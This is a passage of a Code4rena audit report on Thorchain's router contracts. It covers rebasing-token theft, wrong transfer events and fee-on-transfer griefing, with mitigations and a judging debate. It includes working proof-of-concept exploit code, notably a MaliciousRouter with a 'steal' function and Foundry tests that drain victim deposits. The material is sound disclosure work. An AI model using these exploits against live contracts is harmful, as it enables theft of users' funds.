---
sponsor: "Thorchain"
slug: "2024-06-thorchain"
date: "2024-08-05"
title: "Thorchain"
findings: "https://github.com/code-423n4/2024-06-thorchain-findings/issues"
contest: 386
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Thorchain smart contract system written in Solidity/Go. The audit took place between June 5 — June 12, 2024.

## Wardens

42 Wardens contributed reports to Thorchain:

  1. [rbserver](https://code4rena.com/@rbserver)
  2. [samuraii77](https://code4rena.com/@samuraii77)
  3. [ilchovski](https://code4rena.com/@ilchovski)
  4. [Bauchibred](https://code4rena.com/@Bauchibred)
  5. [mt030d](https://code4rena.com/@mt030d)
  6. [\_karanel](https://code4rena.com/@_karanel)
  7. [cheatc0d3](https://code4rena.com/@cheatc0d3)
  8. [Shaheen](https://code4rena.com/@Shaheen)
  9. [Svetoslavb](https://code4rena.com/@Svetoslavb)
  10. [Team\_RockSolid](https://code4rena.com/@Team_RockSolid) ([14si2o\_Flint](https://code4rena.com/@14si2o_Flint), [Drynooo](https://code4rena.com/@Drynooo), [OMEN](https://code4rena.com/@OMEN) and [CaeraDenoir](https://code4rena.com/@CaeraDenoir))
  11. [Greed](https://code4rena.com/@Greed)
  12. [sivanesh\_808](https://code4rena.com/@sivanesh_808)
  13. [bigtone](https://code4rena.com/@bigtone)
  14. [0xAadi](https://code4rena.com/@0xAadi)
  15. [shaflow2](https://code4rena.com/@shaflow2)
  16. [Fortis\_audits](https://code4rena.com/@Fortis_audits) ([Mahi\_Vasisth](https://code4rena.com/@Mahi_Vasisth) and [Bluedragon101](https://code4rena.com/@Bluedragon101))
  17. [Heba-Elhasan](https://code4rena.com/@Heba-Elhasan)
  18. [hunter\_w3b](https://code4rena.com/@hunter_w3b)
  19. [EPSec](https://code4rena.com/@EPSec) ([petarP1998](https://code4rena.com/@petarP1998) and [1337web3](https://code4rena.com/@1337web3))
  20. [PetarTolev](https://code4rena.com/@PetarTolev)
  21. [Gosho](https://code4rena.com/@Gosho)
  22. [dvrkzy](https://code4rena.com/@dvrkzy)
  23. [iam\_emptyset](https://code4rena.com/@iam_emptyset)
  24. [nfmelendez](https://code4rena.com/@nfmelendez)
  25. [dhank](https://code4rena.com/@dhank)
  26. [0xfox](https://code4rena.com/@0xfox)
  27. [TECHFUND-inc](https://code4rena.com/@TECHFUND-inc)
  28. [benoitonchain](https://code4rena.com/@benoitonchain)
  29. [Timenov](https://code4rena.com/@Timenov)
  30. [inh3l](https://code4rena.com/@inh3l)
  31. [Limbooo](https://code4rena.com/@Limbooo)
  32. [LuarSec](https://code4rena.com/@LuarSec) ([GhK3Ndf](https://code4rena.com/@GhK3Ndf) and [lod1n](https://code4rena.com/@lod1n))
  33. [0x1771](https://code4rena.com/@0x1771)
  34. [Naresh](https://code4rena.com/@Naresh)
  35. [hihen](https://code4rena.com/@hihen)
  36. [slvDev](https://code4rena.com/@slvDev)

This audit was judged by [Trust](https://code4rena.com/@Trust).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 4 unique vulnerabilities. Of these vulnerabilities, 2 received a risk rating in the category of HIGH severity and 2 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 6 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Thorchain repository](https://github.com/code-423n4/2024-06-thorchain), and is composed of 3 smart contracts written in the Solidity/Go programming language and includes 1517 lines of Solidity/Go code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (2)
## [[H-01] A malicious user can steal money out of the vault and other users](https://github.com/code-423n4/2024-06-thorchain-findings/issues/85)
*Submitted by [samuraii77](https://github.com/code-423n4/2024-06-thorchain-findings/issues/85), also found by [Bauchibred](https://github.com/code-423n4/2024-06-thorchain-findings/issues/62), [ilchovski](https://github.com/code-423n4/2024-06-thorchain-findings/issues/53), rbserver ([1](https://github.com/code-423n4/2024-06-thorchain-findings/issues/43), [2](https://github.com/code-423n4/2024-06-thorchain-findings/issues/28)), [mt030d](https://github.com/code-423n4/2024-06-thorchain-findings/issues/95), and [cheatc0d3](https://github.com/code-423n4/2024-06-thorchain-findings/issues/105)*

A malicious user can steal money out of other users and the vault when a rebasing token like AMPL is used. That particular token is whitelisted as seen [here](https://gitlab.com/thorchain/thornode/-/blob/develop/common/tokenlist/ethtokens/eth_mainnet_latest.json?ref_type=heads).

### Proof of Concept

In particular, the AMPL token has a `_gonsPerFragment` variable that is used to change the balances of other users. The goal of that is to keep a stable price by manipulating the supply. This creates a huge issue for this particular protocol. The cause of the issue is the fact that upon a user moving his funds to another router, the router is being approved based on the amount of tokens he deposited. However, since that is a rebasing token, that amount can change and allow him to steal funds as explained below.

Imagine the following scenario (will keep it very simplistic):
1. A malicious actor deposits 1000 tokens when the `_gonsPerFragment` is 1 and sets his address as the vault address. The balance of AMPL token in the contract is now 1000 and the allowance he has for his own address is also 1000.
2. `_gonsPerFragment` is now 2 after the `rebase()` function was called on the AMPL contract, he could even frontrun it.
3. He calls `transferAllowance()` with his own malicious router, address of the vault is not important, with `AMPL` as the asset and 1000 tokens as the amount.
4. This calls `_routerDeposit()`, takes out his 1000 tokens from the allowance, approves the malicious router contract for 1000 tokens. The thing here is that the router should not take the tokens, it is just approved.

This is how the malicious router can look like (`depositWithExpiry()` is just a blank function):

```solidity
contract MaliciousRouter {
    function depositWithExpiry(address, address, uint256, string calldata, uint) public {}

    function steal(uint256 amount, address from, address to, address target) public {
        (bool ok, ) = target.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, amount));
        if (!ok) revert();
    }
}
```

5. The balance of the contract is `1000 / 2 = 500` (as `_gonsPerFragment` is 2, take a look at the `AMPL` contract if not knowledgeable of how it works).
6. Now, a legit user deposits 1000 tokens into a legit vault, now balance of the contract is `(1000 + 1000 * 2) / 2 = 1500` and the `_vaultAllowance` for the vault is `1500 - 500 = 1000`.
7. The malicious user can now take some of those funds as he is approved for 1000 tokens, he calls the `steal()` function as specified in the malicious router contract above with his address as the receiver and 1000 tokens as the amount.
8. The allowance check passes (`1000 - 1000 = 0`) and he successfully claims (`2000 / 2 = 1000 tokens`).
9. The balance of the contract is now just `1000 / 2 = 500` tokens when the legit user actually deposited 1000.
10. Whenever he tries to use call `transferOut()`, for example, he will only be able to pass 500 tokens as the input instead of 1000, he essentially lost 50% of his money.

In the end, the malicious user didn't earn anything and he also didn't lose anything but he managed to steal 500 tokens from the victim.

Also, if the balance of the contract increases instead, then that would lead to locked funds.

After reading the code more, there are even easier ways to exploit this issue. The deposit router does not even have to be changed, user can just call `transferOut()`, also funds can be deposited beforehand as well, user can frontrun the rebase by depositing and taking out his funds after it; essentially stealing money out of other users if the balance of AMPL decreased. However, the issue explained above and the POC for it, are still valid and possible.

For the POC, you can initiate a foundry project and paste the following code in `Counter.t.sol`. I simplified the AMPL token but it works the exact same way. You can compare it to the original one:

<details>

```solidity
pragma solidity 0.8.22;

import "../lib/forge-std/src/Test.sol";
import {THORChain_Router} from "../chain/ethereum/contracts/THORChain_Router.sol";

contract AMPLTokenSimplified {
    uint256 public _gonsPerFragment = 1;
    mapping(address => uint256) public _gonBalances;
    mapping(address => mapping(address => uint256)) public _allowedFragments;

    function rebase(uint256 gonsPerFragment_) public {
        _gonsPerFragment = gonsPerFragment_;
    }

    function balanceOf(address who) public view returns (uint256) {
        return _gonBalances[who] / (_gonsPerFragment);
    }

    function transfer(address to, uint256 value)
        public
        returns (bool)
    {
        uint256 gonValue = value * (_gonsPerFragment);

        require(_gonBalances[msg.sender] >= gonValue, "You just got beamed lol");
        
        _gonBalances[msg.sender] = _gonBalances[msg.sender] - (gonValue);
        _gonBalances[to] = _gonBalances[to] + (gonValue);

        return true;
    }

    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowedFragments[owner_][spender];
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool) {
        _allowedFragments[from][msg.sender] = _allowedFragments[from][msg.sender] - (value);

        uint256 gonValue = value * (_gonsPerFragment);
        _gonBalances[from] = _gonBalances[from] - (gonValue);
        _gonBalances[to] = _gonBalances[to] + (gonValue);

        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _allowedFragments[msg.sender][spender] = value;

        return true;
    }

    function mint(uint256 amount, address to) public {
        _gonBalances[to] = amount;
    }
}

contract StealMoney is Test {
  THORChain_Router tcRouter;
  AMPLTokenSimplified ampl;
  MaliciousRouter mRouter;
  address malicious = makeAddr('malicious');
  address victim = makeAddr('legit');
  address vault = makeAddr('legitVault');

  function setUp() public {
    tcRouter = new THORChain_Router();
    ampl = new AMPLTokenSimplified();
    mRouter = new MaliciousRouter();
    ampl.mint(1000, malicious);
    ampl.mint(2000, victim);
  }

  function testStealMoney() public {
    vm.startPrank(malicious);
    ampl.approve(address(tcRouter), type(uint256).max);
    tcRouter.depositWithExpiry(payable(malicious), address(ampl), 1000, "you are about to get beamed", type(uint256).max); // Malicious user deposits 1000 tokens

    vm.assertEq(tcRouter.vaultAllowance(malicious, address(ampl)), 1000); // Vault allowance for the malicious user is 1000 tokens
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 1000); // Balance of contract is 1000 tokens

    ampl.rebase(2); // Set _gonsPerFragment to 2

    // Still pranking malicious
    tcRouter.transferAllowance(address(mRouter), malicious, address(ampl), 1000, "lol"); // This just approves 1000 tokens to spend to our malicious router

    vm.assertEq(tcRouter.vaultAllowance(malicious, address(ampl)), 0);
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 500); // Balance is now 500 because _gonsPerFragment is 2
    vm.assertEq(ampl.allowance(address(tcRouter), address(mRouter)), 1000); // Malicious router has been approved for 1000 tokens
    vm.stopPrank();

    vm.startPrank(victim);
    ampl.approve(address(tcRouter), type(uint256).max);
    tcRouter.depositWithExpiry(payable(vault), address(ampl), 1000, "i am about to get beamed :(", type(uint256).max);

    vm.assertEq(tcRouter.vaultAllowance(vault, address(ampl)), 1000); // Allowance for vault is 1000 tokens
    vm.assertEq(ampl.balanceOf(address(tcRouter)), 1500); // Contract has 1500 tokens
    vm.stopPrank();

    uint256 maliciousBalanceBefore = ampl.balanceOf(malicious);
    mRouter.steal(1000, address(tcRouter), malicious, address(ampl)); // 1000 tokens to be sent from the router to the malicious guy
    uint256 maliciousBalanceAfter = ampl.balanceOf(malicious);

    assertEq(maliciousBalanceBefore, 0);
    assertEq(maliciousBalanceAfter, 1000); // 2000 / 2
    // Did not even lose money

    vm.assertEq(ampl.balanceOf(address(tcRouter)), 500); // Only 500 tokens left in the contract

    vm.startPrank(vault);
    // vm.expectRevert("You just got beamed lol");  // You can uncomment this line and paste this error message as the require statement error message after the transfer call to see this is where it reverts in transferOut()
    vm.expectRevert();
    tcRouter.transferOut(payable(victim), address(ampl), 1000, "did I just get beamed?...");

    uint256 victimBalanceBefore = ampl.balanceOf(victim);

    tcRouter.transferOut(payable(victim), address(ampl), 500, "omg I can only withdraw 500 tokens..");
    vm.stopPrank();
    
    uint256 victimBalanceAfter = ampl.balanceOf(victim);
    assertEq(victimBalanceBefore, 0);
    assertEq(victimBalanceAfter, 500);
  }
}

contract MaliciousRouter {
    function depositWithExpiry(address, address, uint256, string calldata, uint) public {}

    function steal(uint256 amount, address from, address to, address target) public {
        (bool ok, ) = target.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", from, to, amount));
        if (!ok) revert();
    }
}
```

</details>

### Recommended Mitigation Steps

I don't think the fix is trivial, I will give some ideas but they have to be carefully examined. First, one of the root causes for the issue is the approval given to the router that is not actually equal to the amount the user is supposed to receive as this is a rebasing token. If that is taken care of and the correct approval is given, I think this vulnerability shouldn't be possible anymore.

**[Trust (judge) decreased severity to Medium](https://github.com/code-423n4/2024-06-thorchain-findings/issues/85#issuecomment-2182543469)**

**[samuraii77 (warden) commented](https://github.com/code-423n4/2024-06-thorchain-findings/issues/85#issuecomment-2188178339):**
 > I believe this issue is wrongly duplicated. The root cause of the issue it is duplicated to is improper setup for fee-on-transfer tokens and the impact is a DoS. The root cause of this issue is an improper setup for rebasing tokens and the impact is a direct theft of funds. This issue should be its own separate issue and should be a high.

**[Trust (judge) commented](https://github.com/code-423n4/2024-06-thorchain-findings/issues/85#issuecomment-2188201476):**
> Since the contracts don't have code that handles both FoT/rebasing tokens, it is fair to combine the two issues together. If there was an attempt to handle one of the types, but it is bugged, that would indeed merit two different issues.

**[samuraii77 (warden) commented](https://github.com/code-423n4/2024-06-thorchain-findings/issues/85#issuecomment-2188243589):**
 > FoT tokens and rebasing tokens are not the same thing; they have different behaviors and different things that could go wrong when implementing them. 
> 
> **Root Cause:**
> - FoT case: `_transferOutAndCallV5()` assumes that the amount parameter is equal to the amount received.
> - Rebasing case: The contract assumes that the amount that was received time ago through a deposit will stay the same across that time which would not be the case.
> 
> **Impact:**
> - FoT case: User will be DoSed and funds will be locked.
> - Rebasing case: Direct theft of funds.
> 
> **Fix:**
> - FoT case: Use the actual amount received instead of the amount parameter.
> - Rebasing case: Do not assume that the balances will stay constant and implement a mechanism to handle that.
> 
> None of these match up and they should not be duplicated. Furthermore, as I mentioned, FoT tokens and rebasing tokens are not the same thing, it is like duplicating an issue regarding FoT tokens with an issue that used `transferFrom` on tokens that don't revert on failure.

**[Trust (judge) commented](https://github.com/code-423n4/2024-06-thorchain-findings/issues/85#issuecomment-2188251744):**
 > We don't duplicate by impact or fixes, that's irrelevant. The root cause is the same - devs did not have the presence of mind to deal with tokens with non standard balance mechanisms.

**[samuraii77 (warden) commented](https://github.com/code-423n4/2024-06-thorchain-findings/issues/85#issuecomment-2188282281):**
 > Respectfully, what makes this issue a Medium? Why is it not a high when this issue clearly explains an issue with a high severity? Here is a rule regarding that:
> >Given the above, when similar exploits would demonstrate different impacts, the highest, most irreversible would be the one used for scoring the finding. Duplicates of the finding will be graded based on the achieved impact relative to the Submission Chosen for Report.
> 
> >More specifically, if fixing the Root Cause (in a reasonable manner) would cause the finding to no longer be exploitable, then the findings are duplicates.
> 
> Fixing one of the issues does not fix the other one, so your argument that you do not duplicate by fixes is not entirely correct.
> 
> Also, I don't agree that the root cause is the same even ignoring the above rule. You are pulling the root cause up until it is similar but the actual root causes are different, incorrect handling of FoT tokens and incorrect handling of rebasing tokens. The way you generalize the root cause of the issue is similar to saying that all issues are duplicate because the developers wrote code that is wrong. 
> 
> Furthermore, they did have the presence of mind to deal with non-standard balance mechanisms. Take a look at this code in `deposit()`:
>
> ```solidity
> safeAmount = safeTransferFrom(asset, amount);
> ```
>
> Which then calls:
>
> ```solidity
> // Safe transferFrom in case asset charges transfer fees
>   function safeTransferFrom(
>     address _asset,
>     uint _amount
>   ) internal returns (uint amount) {
>     uint _startBal = iERC20(_asset).balanceOf(address(this));
>     (bool success, bytes memory data) = _asset.call(
>       abi.encodeWithSignature(
>         "transferFrom(address,address,uint256)",
>         msg.sender,
>         address(this),
>         _amount
>       )
>     );
>     require(success && (data.length == 0 || abi.decode(data, (bool))));
>     return (iERC20(_asset).balanceOf(address(this)) - _startBal);
>   }
> ```

**[Trust (judge) increased severity to High and commented](https://github.com/code-423n4/2024-06-thorchain-findings/issues/85#issuecomment-2188329956):**
 > I assumed there is no differentiation at the code level between these. As it is clear they aimed to support FoT tokens, there are now clearly two separate root causes.
> Upgrading to High since it is clear these tokens are whitelisted and _intended_ to be used.

**[the-eridanus (Thorchain) confirmed](https://github.com/code-423n4/2024-06-thorchain-findings/issues/85#event-13767281982)**

***

## [[H-02] ThorChain will be informed wrongly about the unsuccessful ETH transfers due to the incorrect events emissions](https://github.com/code-423n4/2024-06-thorchain-findings/issues/17)
*Submitted by [Shaheen](https://github.com/code-423n4/2024-06-thorchain-findings/issues/17), also found by [mt030d](https://github.com/code-423n4/2024-06-thorchain-findings/issues/91), \_karanel ([1](https://github.com/code-423n4/2024-06-thorchain-findings/issues/80), [2](https://github.com/code-423n4/2024-06-thorchain-findings/issues/73)), [bigtone](https://github.com/code-423n4/2024-06-thorchain-findings/issues/74), [ilchovski](https://github.com/code-423n4/2024-06-thorchain-findings/issues/70), [Fortis\_audits](https://github.com/code-423n4/2024-06-thorchain-findings/issues/69), [Team\_RockSolid](https://github.com/code-423n4/2024-06-thorchain-findings/issues/57), [Svetoslavb](https://github.com/code-423n4/2024-06-thorchain-findings/issues/52), [Heba-Elhasan](https://github.com/code-423n4/2024-06-thorchain-findings/issues/41), [Greed](https://github.com/code-423n4/2024-06-thorchain-findings/issues/32), [0xAadi](https://github.com/code-423n4/2024-06-thorchain-findings/issues/29), and [shaflow2](https://github.com/code-423n4/2024-06-thorchain-findings/issues/4)*

<https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/ethereum/contracts/THORChain_Router.sol#L196><br><https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/ethereum/contracts/THORChain_Router.sol#L206>

### Vulnerability details

One of the main invariant of the protocol is:

> Only valid events emitted from the Router contract itself should result in the `txInItem` parameter being populated in the `GetTxInItem` function of the `smartcontract_log_parser`.

In short, this means that all the events `ThorChain_Router` emits, should be correct.

This invariants breaks in the edge cases of the [`transferOut()`](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/ethereum/contracts/THORChain_Router.sol#L185), [`_transferOutV5()`](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/ethereum/contracts/THORChain_Router.sol#L209), [`transferOutAndCall()`](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/ethereum/contracts/THORChain_Router.sol#L261) and [`_transferOutAndCallV5()`](https://github.com/code-423n4/2024-06-thorchain/blob/e3fd3c75ff994dce50d6eb66eb290d467bd494f5/ethereum/contracts/THORChain_Router.sol#L304)

For the sake of simplicity, we will only gonna take a look at the `transferOut()` function.

`transferOut()` function is used by the vaults to transfer Native Tokens (ethers) or ERC20 Tokens to any address `to`. It first transfers the funds to the specified `to` address and then emits the `TransferOut` event for ThorChain. In case the Native Tokens transfer to the `to` address fails, it just refunds or bounce back the ethers to the vault address (`msg.sender`). Transfer to `to` address can fail often, as the function uses solidity's `.send` to transfer the funds. If the `to` address is a contract which takes more than `2300` gas to complete the execution, then `.send` will return `false` and the ethers will be bounced back to the vault address.

The problem is, in the case when the `.send` will fail and the ethers will bounce back to the vault address, the event `TransferOut` will be wrong. As we can see, when the ethers receiver will be in vault, not the input `to` address, the `to` doesn't get updated to the vault's address and the function in the end emits the same `to`, ThorChain is getting informed that the ether receiver is still input `to`:

```solidity
  function transferOut(address payable to, address asset, uint amount, string memory memo) public payable nonReentrant {
    uint safeAmount;
    if (asset == address(0)) {
      safeAmount = msg.value;
      bool success = to.send(safeAmount); // Send ETH.
      if (!success) {
        payable(address(msg.sender)).transfer(safeAmount); // For failure, bounce back to vault & continue.
      }
    } else {
      .....
    }
    ///@audit-issue H worng event `to` incase of the bounce back - PoC: `Should bounce back ethers but emits wrong event`
    emit TransferOut(msg.sender, to, asset, safeAmount, memo);
  }
```

Technically, the ETH transfer is unsuccessful, but the ThorChain is informed that its successful and the funds are successfully transferred to the specified `to` address. Also, the `smartcontract_log_parser`'s `GetTxInItem()` function doesn't ignore these trxs at all, as it doesn't check if `txInItem.To` is equal to the calling vault or not.

### Impact

The network believes the outbound was successful and updates the vaults accordingly, but the outbound was not successful; resulting in loss of funds for the users.

### Proof of Concept

Add this test in the `1_Router.js`:`Fund Yggdrasil, Yggdrasil Transfer Out`. Also make sure to deploy the `Navich` Contract:

```js
    it("Should bounce back ethers but emits wrong event", async function () {
        // Contract Address which doesn't accept ethers
        let navichAddr = navich.address;

        let startBalVault = getBN(await web3.eth.getBalance(ASGARD1));
        let startBalNavich = getBN(await web3.eth.getBalance(navichAddr));

        let tx = await ROUTER1.transferOut(navichAddr, ETH, _400, "ygg+:123", {
            from: ASGARD1,
            value: _400,
        });
        
        let endBalVault = getBN(await web3.eth.getBalance(ASGARD1));
        let endBalNavich = getBN(await web3.eth.getBalance(navichAddr));
          
        // Navich Contract Balance remains same & Vault balance is unchanged as it got the refund (only gas fee cut)
        expect(BN2Str(startBalNavich)).to.equal(BN2Str(endBalNavich));
        expect(BN2Str(endBalVault)).to.not.equal(BN2Str(startBalVault) - _400);
          
        // 4 Events Logs as expected
        expect(tx.logs[0].event).to.equal("TransferOut");
        expect(tx.logs[0].args.asset).to.equal(ETH);
        expect(tx.logs[0].args.memo).to.equal("ygg+:123");
        expect(tx.logs[0].args.vault).to.equal(ASGARD1);
        expect(BN2Str(tx.logs[0].args.amount)).to.equal(_400);
          
        //🔺 Event Log of `to` address is Navich Contract instaed of the Vault (actual funds receiver) 
        expect(tx.logs[0].args.to).to.equal(navichAddr);
    });
```

```solidity
contract Navich {
    receive() external payable {
        require(msg.value == 0, "BRUH");
    }
}
```

### Tools Used

[Shaheen Vision](https://x.com/0x_Shaheen/status/1722664258142650806)

### Recommended Mitigation Steps

There are multiple solutions to this issue:

1. Only emit event when transfer to the target is successful (highly recommended):

```solidity
  function transferOut(address payable to, address asset, uint amount, string memory memo) public payable nonReentrant {
    uint safeAmount;
    if (asset == address(0)) {
      safeAmount = msg.value;
      bool success = to.send(safeAmount); // Send ETH.
      emit TransferOut(msg.sender, to, asset, safeAmount, memo);
      if (!success) {
        payable(address(msg.sender)).transfer(safeAmount); // For failure, bounce back to vault & continue.
      }
    } else {
      _vaultAllowance[msg.sender][asset] -= amount; // Reduce allowance
      (bool success, bytes memory data) = asset.call(
        abi.encodeWithSignature("transfer(address,uint256)", to, amount)
      );
      require(success && (data.length == 0 || abi.decode(data, (bool))));
      safeAmount = amount;
      emit TransferOut(msg.sender, to, asset, safeAmount, memo);
    }
  }
```

2. Simply Revert the trx upon `.send` failure.
3. Set `to` address to the vault when bounce back happens.
4. Ignore these trxs in the `smartcontract_log_parser`'s `GetTxInItem()`.
5. Use `.call` which will potentially lower the chance of failure while transferring the ethers (least recommended).

### Assessed type

Context

**[the-eridanus (Thorchain) confirmed and commented](https://github.com/code-423n4/2024-06-thorchain-findings/issues/17#issuecomment-2174037628):**
 > Seems like a good fix to make.

***
 
# Medium Risk Findings (2)
## [[M-01] Incorrect call argument in `THORChain_Router::_transferOutAndCallV5`, leading to grief/steal of `THORChain_Aggregator`'s funds or DoS](https://github.com/code-423n4/2024-06-thorchain-findings/issues/55)
*Submitted by [Svetoslavb](https://github.com/code-423n4/2024-06-thorchain-findings/issues/55), also found by [dvrkzy](https://github.com/code-423n4/2024-06-thorchain-findings/issues/84), [iam\_emptyset](https://github.com/code-423n4/2024-06-thorchain-findings/issues/83), [samuraii77](https://github.com/code-423n4/2024-06-thorchain-findings/issues/81), [nfmelendez](https://github.com/code-423n4/2024-06-thorchain-findings/issues/64), [Team\_RockSolid](https://github.com/code-423n4/2024-06-thorchain-findings/issues/58), [dhank](https://github.com/code-423n4/2024-06-thorchain-findings/issues/46), [PetarTolev](https://github.com/code-423n4/2024-06-thorchain-findings/issues/45), [Shaheen](https://github.com/code-423n4/2024-06-thorchain-findings/issues/40), [Greed](https://github.com/code-423n4/2024-06-thorchain-findings/issues/38), [Gosho](https://github.com/code-423n4/2024-06-thorchain-findings/issues/31), and [rbserver](https://github.com/code-423n4/2024-06-thorchain-findings/issues/15)*

When transferring a token, which is of type fee-on-transfer, in `THORChain_Router::_transferOutAndCallV5`, the token is first deposited to the `THORChain_Aggregator` and then `THORChain_Aggregator::swapOutV5` is called with the same amount. The call will always revert if the `THORChain_Aggregator` does not have tokens or grief/steal (depending on the token) of `THORChain_Aggregator`'s tokens.
An example of a fee-on-transfer token that is in the whitelist is `PAXG` ([see here](https://gitlab.com/thorchain/thornode/-/blob/develop/common/tokenlist/ethtokens/eth_mainnet_latest.json?ref_type=heads#L1870)) to view the loss of funds that are locked and waiting to be rescued in the `THORChain_Aggregator`.

### Proof of Concept

To reproduce this, please add the following test fee-on-transfer token. Create a file inside `ethereum/contracts` with the name `FeeOnTransferToken.sol`.

Paste this inside:

<details>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

interface iERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

contract FeeOnTransferERC20Token is iERC20 {
    using SafeMath for uint256;

    string public name;
    string public symbol;
    uint256 public decimals = 18;
    uint256 public override totalSupply = 1 * 10 ** 6 * (10 ** decimals);
    uint256 immutable fee;

    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(uint256 _fee) {
        balanceOf[msg.sender] = totalSupply;
        name = "Token";
        symbol = "TKN";
        emit Transfer(address(0), msg.sender, totalSupply);
        fee = _fee;
    }

    function mint(address to, uint256 value) public returns (bool success) {
        require(to != address(0), "address error");
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(address(0), to, value);
        return true;
    }

    function transfer(address to, uint256 value) public override returns (bool success) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public override returns (bool success) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public override returns (bool success) {
        require(value <= allowance[from][msg.sender], "allowance error");
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address _from, address _to, uint256 _value) internal {
        require(_to != address(0), "address error");
        require(balanceOf[_from] >= _value, "balance error");
        require(balanceOf[_to].add(_value) >= balanceOf[_to], "balance error");
        balanceOf[_from] = balanceOf[_from].sub(_value);
        balanceOf[_to] = balanceOf[_to].add(_value.sub(fee));
        balanceOf[address(0)] = balanceOf[address(0)].add(fee);
        emit Transfer(_from, _to, _value);
    }
}
```

</details>

The next step is to add a test with this token. Because the other tests are with hard-coded gas asset assertion values, the easiest way is to add new test. Create a file in `ethereum/test` (next to other tests) and paste this:

<details>

```javascript
const Router = artifacts.require('THORChain_Router');
const Aggregator = artifacts.require('THORChain_Aggregator');
const FailingAggregator = artifacts.require('THORChain_Failing_Aggregator');

const SushiRouter = artifacts.require('SushiRouterSmol');
const Token = artifacts.require('FeeOnTransferERC20Token');
const Weth = artifacts.require('WETH');
const BigNumber = require('bignumber.js');
const { expect } = require('chai');
function BN2Str(BN) {
  return new BigNumber(BN).toFixed();
}
function getBN(BN) {
  return new BigNumber(BN);
}

var ROUTER;
var ASGARD;
var AGG;
var WETH;
var SUSHIROUTER;
var FEE_ON_TRANSFER_TOKEN;
var WETH;
var ETH = '0x0000000000000000000000000000000000000000';
var USER1;

const _1 = '1000000000000000000';
const _10 = '10000000000000000000';
const _20 = '20000000000000000000';

const transferFee = '1000000';

const currentTime = Math.floor(Date.now() / 1000 + 15 * 60); // time plus 15 mins

describe('Aggregator griefing', function () {
  let accounts;

  before(async function () {
    accounts = await web3.eth.getAccounts();
    ROUTER = await Router.new();
    FEE_ON_TRANSFER_TOKEN = await Token.new(transferFee); // User gets 1m TOKENS during construction
    USER1 = accounts[0];
    ASGARD = accounts[3];

    WETH = await Weth.new();
    SUSHIROUTER = await SushiRouter.new(WETH.address);
    AGG = await Aggregator.new(WETH.address, SUSHIROUTER.address);
    FAIL_AGG = await FailingAggregator.new(WETH.address, SUSHIROUTER.address);
  });

  it('Should Deposit Assets to Router', async function () {
    await web3.eth.sendTransaction({
      to: SUSHIROUTER.address,
      from: USER1,
      value: _10,
    });
    await web3.eth.sendTransaction({
      to: WETH.address,
      from: USER1,
      value: _10,
    });
    await WETH.transfer(SUSHIROUTER.address, _10);

    expect(BN2Str(await web3.eth.getBalance(SUSHIROUTER.address))).to.equal(
      _10
    );
    expect(BN2Str(await WETH.balanceOf(SUSHIROUTER.address))).to.equal(_10);
  });

  it("Should grief/steal Aggregator's tokens on Swap Out using AggregatorV5 with FEE_ON_TRANSFER_TOKEN", async function () {
    /* 
      Mint FEE_ON_TRANSFER_TOKEN the aggregator
      This mocks a situation where the swapOutV5 has failed and vault's tokens are in the aggregator 
    */
    await FEE_ON_TRANSFER_TOKEN.mint(AGG.address, _20);

    /* Get starting balances of the FEE_ON_TRANSFER_TOKEN */
    const startingTokenBalanceOfUser1 = await FEE_ON_TRANSFER_TOKEN.balanceOf(
      USER1
    );
    const startingTokenBalanceOfAggregator =
      await FEE_ON_TRANSFER_TOKEN.balanceOf(AGG.address);
